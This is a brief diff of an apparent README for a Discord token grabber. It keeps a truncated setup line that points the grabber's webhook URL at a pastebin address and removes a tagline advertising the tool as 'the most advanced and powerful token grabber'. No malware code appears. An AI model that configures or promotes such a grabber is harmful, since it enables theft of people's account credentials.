@@ -57,7 +57,3 @@ EL1T3(dynamic_url= True, webhook_url= "https://pastebin.com/raw/bNcRrQiK", api_u
 
 <h1 align="center">DATABASE SCREENSHOT</h1>
 <img align="center" src="https://media.discordapp.net/attachments/823351707110473789/823356873637494794/unknown.png">
-
-#
-
-<h1 align="center">"тнe мoѕт αdvαɴced αɴd powerғυl тoĸeɴ ɢrαввer"<br>ιтѕ_Ѵιcнч#1337<br><br>Builder Soon</h1>
